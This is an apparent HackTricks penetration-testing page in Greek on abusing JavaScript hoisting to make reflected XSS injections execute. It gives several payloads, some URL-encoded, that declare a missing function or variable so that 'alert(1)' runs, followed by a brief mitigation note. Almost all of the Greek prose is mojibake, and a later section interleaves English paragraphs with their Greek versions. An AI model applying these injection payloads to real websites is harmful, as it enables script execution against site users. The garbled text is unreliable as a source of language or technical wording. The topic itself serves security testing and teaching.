# JS Î‘Î½ÏÏˆÏ‰ÏƒÎ·

<details>

<summary><strong>ÎœÎ¬Î¸ÎµÏ„Îµ Ï„Î¿ Ï‡Î¬ÎºÎ¹Î½Î³Îº Ï„Î¿Ï… AWS Î±Ï€ÏŒ Ï„Î¿ Î¼Î·Î´Î­Î½ Î¼Î­Ï‡ÏÎ¹ Ï„Î¿Î½ Î®ÏÏ‰Î± Î¼Îµ Ï„Î¿</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Î†Î»Î»Î¿Î¹ Ï„ÏÏŒÏ€Î¿Î¹ Ï…Ï€Î¿ÏƒÏ„Î®ÏÎ¹Î¾Î·Ï‚ Ï„Î¿Ï… HackTricks:

* Î•Î¬Î½ Î¸Î­Î»ÎµÏ„Îµ Î½Î± Î´ÎµÎ¯Ï„Îµ Ï„Î·Î½ **ÎµÏ„Î±Î¹ÏÎµÎ¯Î± ÏƒÎ±Ï‚ Î½Î± Î´Î¹Î±Ï†Î·Î¼Î¯Î¶ÎµÏ„Î±Î¹ ÏƒÏ„Î¿ HackTricks** Î® Î½Î± **ÎºÎ±Ï„ÎµÎ²Î¬ÏƒÎµÏ„Îµ Ï„Î¿ HackTricks ÏƒÎµ Î¼Î¿ÏÏ†Î® PDF** ÎµÎ»Î­Î³Î¾Ï„Îµ Ï„Î± [**Î£Î§Î•Î”Î™Î‘ Î£Î¥ÎÎ”Î¡ÎŸÎœÎ—Î£**](https://github.com/sponsors/carlospolop)!
* Î‘Ï€Î¿ÎºÏ„Î®ÏƒÏ„Îµ Ï„Î¿ [**ÎµÏ€Î¯ÏƒÎ·Î¼Î¿ PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Î‘Î½Î±ÎºÎ±Î»ÏÏˆÏ„Îµ [**The PEASS Family**](https://opensea.io/collection/the-peass-family), Ï„Î· ÏƒÏ…Î»Î»Î¿Î³Î® Î¼Î±Ï‚ Î±Ï€ÏŒ Î±Ï€Î¿ÎºÎ»ÎµÎ¹ÏƒÏ„Î¹ÎºÎ¬ [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Î•Î³Î³ÏÎ±Ï†ÎµÎ¯Ï„Îµ ÏƒÏ„Î·** ğŸ’¬ [**Î¿Î¼Î¬Î´Î± Discord**](https://discord.gg/hRep4RUj7f) Î® ÏƒÏ„Î· [**Î¿Î¼Î¬Î´Î± telegram**](https://t.me/peass) Î® **Î±ÎºÎ¿Î»Î¿Ï…Î¸Î®ÏƒÏ„Îµ** Î¼Î±Ï‚ ÏƒÏ„Î¿ **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **ÎœÎ¿Î¹ÏÎ±ÏƒÏ„ÎµÎ¯Ï„Îµ Ï„Î± Ï‡Î¬ÎºÎ¹Î½Î³Îº ÎºÏŒÎ»Ï€Î± ÏƒÎ±Ï‚ Ï…Ï€Î¿Î²Î¬Î»Î»Î¿Î½Ï„Î±Ï‚ PRs ÏƒÏ„Î±** [**HackTricks**](https://github.com/carlospolop/hacktricks) ÎºÎ±Î¹ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) Î±Ï€Î¿Î¸ÎµÏ„Î®ÏÎ¹Î± Ï„Î¿Ï… github.

</details>

## Î’Î±ÏƒÎ¹ÎºÎ­Ï‚ Î Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚

Î£Ï„Î· Î³Î»ÏÏƒÏƒÎ± JavaScript, Ï€ÎµÏÎ¹Î³ÏÎ¬Ï†ÎµÏ„Î±Î¹ Î­Î½Î±Ï‚ Î¼Î·Ï‡Î±Î½Î¹ÏƒÎ¼ÏŒÏ‚ Ï€Î¿Ï… Î¿Î½Î¿Î¼Î¬Î¶ÎµÏ„Î±Î¹ **Î‘Î½ÏÏˆÏ‰ÏƒÎ· (Hoisting)**, ÏŒÏ€Î¿Ï… Î¿Î¹ Î´Î·Î»ÏÏƒÎµÎ¹Ï‚ Î¼ÎµÏ„Î±Î²Î»Î·Ï„ÏÎ½, ÏƒÏ…Î½Î±ÏÏ„Î®ÏƒÎµÏ‰Î½, ÎºÎ»Î¬ÏƒÎµÏ‰Î½ Î® ÎµÎ¹ÏƒÎ±Î³Ï‰Î³ÏÎ½ Î±Î½Ï…ÏˆÏÎ½Î¿Î½Ï„Î±Î¹ Î­Î½Î½Î¿Î¹Î±ÎºÎ¬ ÏƒÏ„Î·Î½ ÎºÎ¿ÏÏ…Ï†Î® Ï„Î¿Ï… Ï€ÎµÎ´Î¯Î¿Ï… Ï„Î¿Ï…Ï‚ Ï€ÏÎ¹Î½ Ï„Î·Î½ ÎµÎºÏ„Î­Î»ÎµÏƒÎ· Ï„Î¿Ï… ÎºÏÎ´Î¹ÎºÎ±. Î‘Ï…Ï„Î® Î· Î´Î¹Î±Î´Î¹ÎºÎ±ÏƒÎ¯Î± Ï€ÏÎ±Î³Î¼Î±Ï„Î¿Ï€Î¿Î¹ÎµÎ¯Ï„Î±Î¹ Î±Ï…Ï„ÏŒÎ¼Î±Ï„Î± Î±Ï€ÏŒ Ï„Î· Î¼Î·Ï‡Î±Î½Î® JavaScript, Î· Î¿Ï€Î¿Î¯Î± Ï€ÎµÏÎ½Î¬ Î±Ï€ÏŒ Ï„Î¿Î½ ÎºÏÎ´Î¹ÎºÎ± ÏƒÎµ Ï€Î¿Î»Î»Î¬ Ï€Î­ÏÎ±ÏƒÎ¼Î±Ï„Î±.

ÎšÎ±Ï„Î¬ Ï„Î¿ Ï€ÏÏÏ„Î¿ Ï€Î­ÏÎ±ÏƒÎ¼Î±, Î· Î¼Î·Ï‡Î±Î½Î® Î±Î½Î±Î»ÏÎµÎ¹ Ï„Î¿Î½ ÎºÏÎ´Î¹ÎºÎ± Î³Î¹Î± Î½Î± ÎµÎ»Î­Î³Î¾ÎµÎ¹ Ï„Î± ÏƒÏ…Î½Ï„Î±ÎºÏ„Î¹ÎºÎ¬ ÏƒÏ†Î¬Î»Î¼Î±Ï„Î± ÎºÎ±Î¹ Î½Î± Ï„Î¿Î½ Î¼ÎµÏ„Î±Ï„ÏÎ­ÏˆÎµÎ¹ ÏƒÎµ Î­Î½Î± Î±Ï†Î·ÏÎ·Î¼Î­Î½Î¿ Î´Î­Î½Ï„ÏÎ¿ ÏƒÏÎ½Ï„Î±Î¾Î·Ï‚. Î‘Ï…Ï„Î® Î· Ï†Î¬ÏƒÎ· Ï€ÎµÏÎ¹Î»Î±Î¼Î²Î¬Î½ÎµÎ¹ Ï„Î·Î½ Î±Î½ÏÏˆÏ‰ÏƒÎ·, Î¼Î¹Î± Î´Î¹Î±Î´Î¹ÎºÎ±ÏƒÎ¯Î± ÏŒÏ€Î¿Ï… Î¿ÏÎ¹ÏƒÎ¼Î­Î½ÎµÏ‚ Î´Î·Î»ÏÏƒÎµÎ¹Ï‚ Î¼ÎµÏ„Î±ÎºÎ¹Î½Î¿ÏÎ½Ï„Î±Î¹ ÏƒÏ„Î·Î½ ÎºÎ¿ÏÏ…Ï†Î® Ï„Î¿Ï… Ï€ÎµÏÎ¹Î²Î¬Î»Î»Î¿Î½Ï„Î¿Ï‚ ÎµÎºÏ„Î­Î»ÎµÏƒÎ·Ï‚. Î•Î¬Î½ Ï„Î¿ Ï€Î­ÏÎ±ÏƒÎ¼Î± Î±Î½Î¬Î»Ï…ÏƒÎ·Ï‚ ÎµÎ¯Î½Î±Î¹ ÎµÏ€Î¹Ï„Ï…Ï‡Î·Î¼Î­Î½Î¿, Ï‡Ï‰ÏÎ¯Ï‚ ÏƒÏ…Î½Ï„Î±ÎºÏ„Î¹ÎºÎ¬ ÏƒÏ†Î¬Î»Î¼Î±Ï„Î±, Î· ÎµÎºÏ„Î­Î»ÎµÏƒÎ· Ï„Î¿Ï… ÏƒÎµÎ½Î±ÏÎ¯Î¿Ï… ÏƒÏ…Î½ÎµÏ‡Î¯Î¶ÎµÏ„Î±Î¹.

Î•Î¯Î½Î±Î¹ ÎºÏÎ¯ÏƒÎ¹Î¼Î¿ Î½Î± ÎºÎ±Ï„Î±Î½Î¿Î®ÏƒÎµÏ„Îµ ÏŒÏ„Î¹:

1. Î¤Î¿ ÏƒÎµÎ½Î¬ÏÎ¹Î¿ Ï€ÏÎ­Ï€ÎµÎ¹ Î½Î± ÎµÎ¯Î½Î±Î¹ Î±Ï€Î±Î»Î»Î±Î³Î¼Î­Î½Î¿ Î±Ï€ÏŒ ÏƒÏ…Î½Ï„Î±ÎºÏ„Î¹ÎºÎ¬ ÏƒÏ†Î¬Î»Î¼Î±Ï„Î± Î³Î¹Î± Î½Î± Ï€ÏÎ±Î³Î¼Î±Ï„Î¿Ï€Î¿Î¹Î·Î¸ÎµÎ¯ Î· ÎµÎºÏ„Î­Î»ÎµÏƒÎ·. ÎŸÎ¹ ÎºÎ±Î½ÏŒÎ½ÎµÏ‚ ÏƒÏ…Î½Ï„Î±ÎºÏ„Î¹ÎºÎ¿Ï Ï€ÏÎ­Ï€ÎµÎ¹ Î½Î± Ï„Î·ÏÎ¿ÏÎ½Ï„Î±Î¹ Î±Ï…ÏƒÏ„Î·ÏÎ¬.
2. Î— Ï„Î¿Ï€Î¿Î¸Î­Ï„Î·ÏƒÎ· Ï„Î¿Ï… ÎºÏÎ´Î¹ÎºÎ± Î¼Î­ÏƒÎ± ÏƒÏ„Î¿ ÏƒÎµÎ½Î¬ÏÎ¹Î¿ ÎµÏ€Î·ÏÎµÎ¬Î¶ÎµÎ¹ Ï„Î·Î½ ÎµÎºÏ„Î­Î»ÎµÏƒÎ· Î»ÏŒÎ³Ï‰ Ï„Î·Ï‚ Î±Î½ÏÏˆÏ‰ÏƒÎ·Ï‚, Î±Î½ ÎºÎ±Î¹ Î¿ ÎµÎºÏ„ÎµÎ»Î¿ÏÎ¼ÎµÎ½Î¿Ï‚ ÎºÏÎ´Î¹ÎºÎ±Ï‚ Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Î´Î¹Î±Ï†Î­ÏÎµÎ¹ Î±Ï€ÏŒ Ï„Î·Î½ ÎºÎµÎ¹Î¼ÎµÎ½Î¹ÎºÎ® Ï„Î¿Ï… Î±Î½Î±Ï€Î±ÏÎ¬ÏƒÏ„Î±ÏƒÎ·.

#### Î¤ÏÏ€Î¿Î¹ Î‘Î½ÏÏˆÏ‰ÏƒÎ·Ï‚

Î’Î¬ÏƒÎµÎ¹ Ï„Ï‰Î½ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¹ÏÎ½ Î±Ï€ÏŒ Ï„Î¿ MDN, Ï…Ï€Î¬ÏÏ‡Î¿Ï…Î½ Ï„Î­ÏƒÏƒÎµÏÎ¹Ï‚ Î´Î¹Î±ÎºÏÎ¹Ï„Î¿Î¯ Ï„ÏÏ€Î¿Î¹ Î±Î½ÏÏˆÏ‰ÏƒÎ·Ï‚ ÏƒÏ„Î· JavaScript:

1. **Î‘Î½ÏÏˆÏ‰ÏƒÎ· Î¤Î¹Î¼Î®Ï‚**: Î•Ï€Î¹Ï„ÏÎ­Ï€ÎµÎ¹ Ï„Î· Ï‡ÏÎ®ÏƒÎ· Ï„Î·Ï‚ Ï„Î¹Î¼Î®Ï‚ Î¼Î¹Î±Ï‚ Î¼ÎµÏ„Î±Î²Î»Î·Ï„Î®Ï‚ ÎµÎ½Ï„ÏŒÏ‚ Ï„Î¿Ï… Ï€ÎµÎ´Î¯Î¿Ï… Ï„Î·Ï‚ Ï€ÏÎ¹Î½ Î±Ï€ÏŒ Ï„Î· Î³ÏÎ±Î¼Î¼Î® Ï„Î·Ï‚ Î´Î®Î»Ï‰ÏƒÎ®Ï‚ Ï„Î·Ï‚.
2. **Î‘Î½ÏÏˆÏ‰ÏƒÎ· Î”Î®Î»Ï‰ÏƒÎ·Ï‚**: Î•Ï€Î¹Ï„ÏÎ­Ï€ÎµÎ¹ Ï„Î·Î½ Î±Î½Î±Ï†Î¿ÏÎ¬ ÏƒÎµ Î¼Î¹Î± Î¼ÎµÏ„Î±Î²Î»Î·Ï„Î® ÎµÎ½Ï„ÏŒÏ‚ Ï„Î¿Ï… Ï€ÎµÎ´Î¯Î¿Ï… Ï„Î·Ï‚ Ï€ÏÎ¹Î½ Î±Ï€ÏŒ Ï„Î· Î´Î®Î»Ï‰ÏƒÎ® Ï„Î·Ï‚ Ï‡Ï‰ÏÎ¯Ï‚ Î½Î± Ï€ÏÎ¿ÎºÎ±Î»ÎµÎ¯ Î­Î½Î± `ReferenceError`, Î±Î»Î»Î¬ Î· Ï„Î¹Î¼Î® Ï„Î·Ï‚ Î¼ÎµÏ„Î±Î²Î»Î·Ï„Î®Ï‚ Î¸Î± ÎµÎ¯Î½Î±Î¹ `undefined`.
3. Î‘Ï…Ï„ÏŒÏ‚ Î¿ Ï„ÏÏ€Î¿Ï‚ Î±Î»Î»Î¬Î¶ÎµÎ¹ Ï„Î· ÏƒÏ…Î¼Ï€ÎµÏÎ¹Ï†Î¿ÏÎ¬ ÎµÎ½Ï„ÏŒÏ‚ Ï„Î¿Ï… Ï€ÎµÎ´Î¯Î¿Ï… Ï„Î·Ï‚ Î»ÏŒÎ³Ï‰ Ï„Î·Ï‚ Î´Î®Î»Ï‰ÏƒÎ·Ï‚ Ï„Î·Ï‚ Î¼ÎµÏ„Î±Î²Î»Î·Ï„Î®Ï‚ Ï€ÏÎ¹Î½ Î±Ï€ÏŒ Ï„Î·Î½ Ï€ÏÎ±Î³Î¼Î±Ï„Î¹ÎºÎ® Ï„Î·Ï‚ Î³ÏÎ±Î¼Î¼Î® Î´Î®Î»Ï‰ÏƒÎ·Ï‚.
4. ÎŸÎ¹ Ï€Î±ÏÎµÎ½Î­ÏÎ³ÎµÎ¹ÎµÏ‚ Ï„Î·Ï‚ Î´Î®Î»Ï‰ÏƒÎ·Ï‚ ÏƒÏ…Î¼Î²Î±Î¯Î½Î¿Ï…Î½ Ï€ÏÎ¹Î½ Î±Ï€ÏŒ Ï„Î¿Î½ Ï…Ï€ÏŒÎ»Î¿Î¹Ï€Î¿ ÎºÏÎ´Î¹ÎºÎ± Ï€Î¿Ï… Ï„Î·Î½ Ï€ÎµÏÎ¹Î­Ï‡ÎµÎ¹ Î½Î± Î±Î¾Î¹Î¿Î»Î¿Î³Î·Î¸ÎµÎ¯.

Î›ÎµÏ€Ï„Î¿Î¼ÎµÏÏÏ‚, Î¿Î¹ Î´Î·Î»ÏÏƒÎµÎ¹Ï‚ ÏƒÏ…Î½Î±ÏÏ„Î®ÏƒÎµÏ‰Î½ ÎµÎ¼Ï†Î±Î½Î¯Î¶Î¿Ï…Î½ ÏƒÏ…Î¼Ï€ÎµÏÎ¹Ï†Î¿ÏÎ¬ Î±Î½ÏÏˆÏ‰ÏƒÎ·Ï‚ Ï„ÏÏ€Î¿Ï… 1. Î— Î»Î­Î¾Î·-ÎºÎ»ÎµÎ¹Î´Î¯ `var` ÎµÏ€Î¹Î´ÎµÎ¹ÎºÎ½ÏÎµÎ¹ ÏƒÏ…Î¼Ï€ÎµÏÎ¹Ï†Î¿ÏÎ¬ Î±Î½ÏÏˆÏ‰ÏƒÎ·Ï‚ Ï„ÏÏ€Î¿Ï… 2. ÎŸÎ¹ Î»ÎµÎºÏ„Î¹ÎºÎ­Ï‚ Î´Î·Î»ÏÏƒÎµÎ¹Ï‚, Ï€Î¿Ï… Ï€ÎµÏÎ¹Î»Î±Î¼Î²Î¬Î½Î¿Ï…Î½ `let`, `const` ÎºÎ±Î¹ `class`, ÎµÎ¼Ï†Î±Î½Î¯Î¶Î¿Ï…Î½ ÏƒÏ…Î¼Ï€ÎµÏÎ¹Ï†Î¿ÏÎ¬ Î±Î½ÏÏˆÏ‰ÏƒÎ·Ï‚ Ï„ÏÏ€Î¿Ï… 3. Î¤Î­Î»Î¿Ï‚, Î¿Î¹ Î´Î·Î»ÏÏƒÎµÎ¹Ï‚ `import` ÎµÎ¯Î½Î±Î¹ Î¼Î¿Î½Î±Î´Î¹ÎºÎ­Ï‚ ÏƒÏ„Î¿ ÏŒÏ„Î¹ Î±Î½Ï…ÏˆÏÎ½Î¿Î½Ï„Î±Î¹ Î¼Îµ ÎºÎ±Î¹ Ï„ÏÏ€Î¿Ï… 1 ÎºÎ±Î¹ Ï„ÏÏ€Î¿Ï… 4 ÏƒÏ…Î¼Ï€ÎµÏÎ¹Ï†Î¿ÏÎ­Ï‚.


## Î£ÎµÎ½Î¬ÏÎ¹Î±

Î•Ï€Î¿Î¼Î­Î½Ï‰Ï‚, ÎµÎ¬Î½ Î­Ï‡ÎµÏ„Îµ ÏƒÎµÎ½Î¬ÏÎ¹Î± ÏŒÏ€Î¿Ï… Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± **ÎµÎ¹ÏƒÎ¬Î³ÎµÏ„Îµ ÎºÏÎ´Î¹ÎºÎ± JS Î¼ÎµÏ„Î¬ Î±Ï€ÏŒ Ï„Î· Ï‡ÏÎ®ÏƒÎ· ÎµÎ½ÏŒÏ‚ Î¼Î· Î´Î·Î»Ï‰Î¼Î­Î½Î¿Ï… Î±Î½Ï„Î¹ÎºÎµÎ¹Î¼Î­Î½Î¿Ï…**, Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± **Î´Î¹Î¿ÏÎ¸ÏÏƒÎµÏ„Îµ Ï„Î· ÏƒÏÎ½Ï„Î±Î¾Î·** Î´Î·Î»ÏÎ½Î¿Î½Ï„Î¬Ï‚ Ï„Î¿ (ÏÏƒÏ„Îµ Î¿ ÎºÏÎ´Î¹ÎºÎ¬Ï‚ ÏƒÎ±Ï‚ Î½Î± ÎµÎºÏ„ÎµÎ»ÎµÎ¯Ï„Î±Î¹ Î±Î½Ï„Î¯ Î½Î± Ï€ÏÎ¿ÎºÎ±Î»ÎµÎ¯ Î­Î½Î± ÏƒÏ†Î¬Î»Î¼Î±):
```javascript
// The function vulnerableFunction is not defined
vulnerableFunction('test', '<INJECTION>');
// You can define it in your injection to execute JS
//Payload1: param='-alert(1)-'')%3b+function+vulnerableFunction(a,b){return+1}%3b
'-alert(1)-''); function vulnerableFunction(a,b){return 1};

//Payload2: param=test')%3bfunction+vulnerableFunction(a,b){return+1}%3balert(1)
test'); function vulnerableFunction(a,b){ return 1 };alert(1)
```

```javascript
// If a variable is not defined, you could define it in the injection
// In the following example var a is not defined
function myFunction(a,b){
return 1
};
myFunction(a, '<INJECTION>')

//Payload: param=test')%3b+var+a+%3d+1%3b+alert(1)%3b
test'); var a = 1; alert(1);
```

```javascript
// If an undeclared class is used, you cannot declare it AFTER being used
var variable = new unexploitableClass();
<INJECTION>
// But you can actually declare it as a function, being able to fix the syntax with something like:
function unexploitableClass() {
return 1;
}
alert(1);
```

```javascript
// Properties are not hoisted
// So the following examples where the 'cookie' attribute doesnÂ´t exist
// cannot be fixed if you can only inject after that code:
test.cookie('leo','INJECTION')
test['cookie','injection']
```
## Î ÎµÏÎ¹ÏƒÏƒÏŒÏ„ÎµÏÎ± Î£ÎµÎ½Î¬ÏÎ¹Î±

### Scenario 1: JavaScript Hoisting

### Î£ÎµÎ½Î¬ÏÎ¹Î¿ 1: Î‘Î½ÏÏˆÏ‰ÏƒÎ· JavaScript

In this scenario, the attacker exploits the concept of JavaScript hoisting to execute malicious code on a vulnerable website.

Î£Îµ Î±Ï…Ï„ÏŒ Ï„Î¿ ÏƒÎµÎ½Î¬ÏÎ¹Î¿, Î¿ ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿Ï‚ ÎµÎºÎ¼ÎµÏ„Î±Î»Î»ÎµÏÎµÏ„Î±Î¹ Ï„Î·Î½ Î­Î½Î½Î¿Î¹Î± Ï„Î·Ï‚ Î±Î½ÏÏˆÏ‰ÏƒÎ·Ï‚ Ï„Î¿Ï… JavaScript Î³Î¹Î± Î½Î± ÎµÎºÏ„ÎµÎ»Î­ÏƒÎµÎ¹ ÎºÎ±ÎºÏŒÎ²Î¿Ï…Î»Î¿ ÎºÏÎ´Î¹ÎºÎ± ÏƒÎµ Î¼Î¹Î± ÎµÏ…Î¬Î»Ï‰Ï„Î· Î¹ÏƒÏ„Î¿ÏƒÎµÎ»Î¯Î´Î±.

#### Description

#### Î ÎµÏÎ¹Î³ÏÎ±Ï†Î®

JavaScript hoisting is a behavior in JavaScript where variable and function declarations are moved to the top of their containing scope during the compilation phase. This means that even if a variable or function is declared after it is used, it can still be accessed and executed.

Î— Î±Î½ÏÏˆÏ‰ÏƒÎ· Ï„Î¿Ï… JavaScript ÎµÎ¯Î½Î±Î¹ Î­Î½Î± ÏƒÏ…Î¼Ï€ÎµÏÎ¹Ï†Î¿ÏÎ¬ ÏƒÏ„Î·Î½ JavaScript ÏŒÏ€Î¿Ï… Î¿Î¹ Î´Î·Î»ÏÏƒÎµÎ¹Ï‚ Î¼ÎµÏ„Î±Î²Î»Î·Ï„ÏÎ½ ÎºÎ±Î¹ ÏƒÏ…Î½Î±ÏÏ„Î®ÏƒÎµÏ‰Î½ Î¼ÎµÏ„Î±ÎºÎ¹Î½Î¿ÏÎ½Ï„Î±Î¹ ÏƒÏ„Î·Î½ ÎºÎ¿ÏÏ…Ï†Î® Ï„Î¿Ï… Ï€ÎµÏÎ¹Î­Ï‡Î¿Î½Ï„Î¿Ï‚ Ï€ÎµÎ´Î¯Î¿Ï… Ï„Î¿Ï…Ï‚ ÎºÎ±Ï„Î¬ Ï„Î· Ï†Î¬ÏƒÎ· Ï„Î·Ï‚ Î¼ÎµÏ„Î±Î³Î»ÏÏ„Ï„Î¹ÏƒÎ·Ï‚. Î‘Ï…Ï„ÏŒ ÏƒÎ·Î¼Î±Î¯Î½ÎµÎ¹ ÏŒÏ„Î¹ Î±ÎºÏŒÎ¼Î± ÎºÎ¹ Î±Î½ Î¼Î¹Î± Î¼ÎµÏ„Î±Î²Î»Î·Ï„Î® Î® Î¼Î¹Î± ÏƒÏ…Î½Î¬ÏÏ„Î·ÏƒÎ· Î´Î·Î»ÏÎ½ÎµÏ„Î±Î¹ Î¼ÎµÏ„Î¬ Ï„Î· Ï‡ÏÎ®ÏƒÎ· Ï„Î·Ï‚, Î¼Ï€Î¿ÏÎµÎ¯ Î±ÎºÏŒÎ¼Î± Î½Î± Ï€ÏÎ¿ÏƒÏ€ÎµÎ»Î±ÏƒÏ„ÎµÎ¯ ÎºÎ±Î¹ Î½Î± ÎµÎºÏ„ÎµÎ»ÎµÏƒÏ„ÎµÎ¯.

#### Exploitation

#### Î•ÎºÎ¼ÎµÏ„Î¬Î»Î»ÎµÏ…ÏƒÎ·

The attacker identifies a vulnerable website that allows user input to be reflected in JavaScript code without proper sanitization or validation.

ÎŸ ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿Ï‚ ÎµÎ½Ï„Î¿Ï€Î¯Î¶ÎµÎ¹ Î¼Î¹Î± ÎµÏ…Î¬Î»Ï‰Ï„Î· Î¹ÏƒÏ„Î¿ÏƒÎµÎ»Î¯Î´Î± Ï€Î¿Ï… ÎµÏ€Î¹Ï„ÏÎ­Ï€ÎµÎ¹ Ï„Î·Î½ ÎµÎ¹ÏƒÎ±Î³Ï‰Î³Î® Ï‡ÏÎ®ÏƒÏ„Î· Î½Î± Î±Î½Ï„Î±Î½Î±ÎºÎ»Î¬Ï„Î±Î¹ ÏƒÏ„Î¿Î½ ÎºÏÎ´Î¹ÎºÎ± Ï„Î¿Ï… JavaScript Ï‡Ï‰ÏÎ¯Ï‚ ÎºÎ±Ï„Î¬Î»Î»Î·Î»Î· Î±Ï€Î¿Î»ÏÎ¼Î±Î½ÏƒÎ· Î® ÎµÏ€Î¹ÎºÏÏÏ‰ÏƒÎ·.

The attacker crafts a payload that includes a JavaScript function declaration or variable assignment.

ÎŸ ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿Ï‚ Î´Î·Î¼Î¹Î¿Ï…ÏÎ³ÎµÎ¯ Î­Î½Î± Ï†Î¿ÏÏ„Î¯Î¿ Ï€Î¿Ï… Ï€ÎµÏÎ¹Î»Î±Î¼Î²Î¬Î½ÎµÎ¹ Î¼Î¹Î± Î´Î®Î»Ï‰ÏƒÎ· ÏƒÏ…Î½Î¬ÏÏ„Î·ÏƒÎ·Ï‚ Ï„Î¿Ï… JavaScript Î® Î±Î½Î¬Î¸ÎµÏƒÎ· Î¼ÎµÏ„Î±Î²Î»Î·Ï„Î®Ï‚.

The payload is injected into the vulnerable website through user input, such as a form field or a URL parameter.

Î¤Î¿ Ï†Î¿ÏÏ„Î¯Î¿ ÎµÎ¹ÏƒÎ¬Î³ÎµÏ„Î±Î¹ ÏƒÏ„Î·Î½ ÎµÏ…Î¬Î»Ï‰Ï„Î· Î¹ÏƒÏ„Î¿ÏƒÎµÎ»Î¯Î´Î± Î¼Î­ÏƒÏ‰ Ï„Î·Ï‚ ÎµÎ¹ÏƒÏŒÎ´Î¿Ï… Ï„Î¿Ï… Ï‡ÏÎ®ÏƒÏ„Î·, ÏŒÏ€Ï‰Ï‚ Î­Î½Î± Ï€ÎµÎ´Î¯Î¿ Ï†ÏŒÏÎ¼Î±Ï‚ Î® Î­Î½Î± Ï€Î±ÏÎ¬Î¼ÎµÏ„ÏÎ¿ URL.

When the vulnerable website processes the user input and executes the JavaScript code, the hoisting behavior moves the function declaration or variable assignment to the top of the scope, allowing the attacker's payload to be executed.

ÎŒÏ„Î±Î½ Î· ÎµÏ…Î¬Î»Ï‰Ï„Î· Î¹ÏƒÏ„Î¿ÏƒÎµÎ»Î¯Î´Î± ÎµÏ€ÎµÎ¾ÎµÏÎ³Î¬Î¶ÎµÏ„Î±Î¹ Ï„Î·Î½ ÎµÎ¯ÏƒÎ¿Î´Î¿ Ï„Î¿Ï… Ï‡ÏÎ®ÏƒÏ„Î· ÎºÎ±Î¹ ÎµÎºÏ„ÎµÎ»ÎµÎ¯ Ï„Î¿Î½ ÎºÏÎ´Î¹ÎºÎ± Ï„Î¿Ï… JavaScript, Î· ÏƒÏ…Î¼Ï€ÎµÏÎ¹Ï†Î¿ÏÎ¬ Ï„Î·Ï‚ Î±Î½ÏÏˆÏ‰ÏƒÎ·Ï‚ Î¼ÎµÏ„Î±ÎºÎ¹Î½ÎµÎ¯ Ï„Î· Î´Î®Î»Ï‰ÏƒÎ· Ï„Î·Ï‚ ÏƒÏ…Î½Î¬ÏÏ„Î·ÏƒÎ·Ï‚ Î® Ï„Î·Î½ Î±Î½Î¬Î¸ÎµÏƒÎ· Ï„Î·Ï‚ Î¼ÎµÏ„Î±Î²Î»Î·Ï„Î®Ï‚ ÏƒÏ„Î·Î½ ÎºÎ¿ÏÏ…Ï†Î® Ï„Î¿Ï… Ï€ÎµÎ´Î¯Î¿Ï…, ÎµÏ€Î¹Ï„ÏÎ­Ï€Î¿Î½Ï„Î±Ï‚ Ï„Î·Î½ ÎµÎºÏ„Î­Î»ÎµÏƒÎ· Ï„Î¿Ï… Ï†Î¿ÏÏ„Î¯Î¿Ï… Ï„Î¿Ï… ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿Ï….

#### Mitigation

#### Î‘Î½Ï„Î¹Î¼ÎµÏ„ÏÏ€Î¹ÏƒÎ·

To prevent JavaScript hoisting attacks, it is important to properly sanitize and validate user input before reflecting it in JavaScript code.

Î“Î¹Î± Î½Î± Î±Ï€Î¿Ï„ÏÎ±Ï€Î¿ÏÎ½ Î¿Î¹ ÎµÏ€Î¹Î¸Î­ÏƒÎµÎ¹Ï‚ Î±Î½ÏÏˆÏ‰ÏƒÎ·Ï‚ Ï„Î¿Ï… JavaScript, ÎµÎ¯Î½Î±Î¹ ÏƒÎ·Î¼Î±Î½Ï„Î¹ÎºÏŒ Î½Î± Î±Ï€Î¿Î»Ï…Î¼Î±Î¯Î½ÎµÏ„Î±Î¹ ÎºÎ±Î¹ Î½Î± ÎµÏ€Î¹ÎºÏ…ÏÏÎ½ÎµÏ„Î±Î¹ ÏƒÏ‰ÏƒÏ„Î¬ Î· ÎµÎ¯ÏƒÎ¿Î´Î¿Ï‚ Ï„Î¿Ï… Ï‡ÏÎ®ÏƒÏ„Î· Ï€ÏÎ¹Î½ Î±Î½Ï„Î±Î½Î±ÎºÎ»Î±ÏƒÏ„ÎµÎ¯ ÏƒÏ„Î¿Î½ ÎºÏÎ´Î¹ÎºÎ± Ï„Î¿Ï… JavaScript.

Additionally, developers should follow secure coding practices, such as using strict mode in JavaScript to catch undeclared variables and functions.

